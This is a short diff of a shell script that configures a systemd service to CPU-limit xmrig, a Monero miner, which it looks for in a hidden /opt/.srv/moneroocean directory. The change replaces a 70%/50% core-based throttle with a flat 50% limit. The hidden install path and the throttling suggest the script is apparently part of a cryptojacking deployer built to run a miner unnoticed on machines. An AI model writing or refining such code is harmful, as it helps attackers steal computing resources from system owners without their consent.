@@ -22,13 +22,8 @@ if [ -f "$NEW_SERVICE_FILE" ]; then
         echo "Configuring systemd service for automatic cpulimit application..."
         CPU_CORES=$(nproc)
         echo "Detected CPU cores: $CPU_CORES"
-        if [ "$CPU_CORES" -ge 4 ]; then
-            CPU_LIMIT=$(echo "$CPU_CORES * 100 * 70 / 100" | bc)
-            echo "Setting CPU limit: $CPU_LIMIT (70% of $CPU_CORES cores)"
-        else
-            CPU_LIMIT=$(echo "$CPU_CORES * 100 * 50 / 100" | bc)
-            echo "Setting CPU limit: $CPU_LIMIT (50% of $CPU_CORES cores)"
-        fi
+        CPU_LIMIT=$(echo "$CPU_CORES * 100 * 50 / 100" | bc)
+        echo "Setting CPU limit: $CPU_LIMIT (50% of $CPU_CORES cores)"
         XMRIG_PATH=$(which xmrig 2>/dev/null || find /opt/.srv -name "xmrig" -type f 2>/dev/null | head -1)
         if [ -z "$XMRIG_PATH" ]; then
             if [ -f "/opt/.srv/moneroocean/xmrig" ]; then
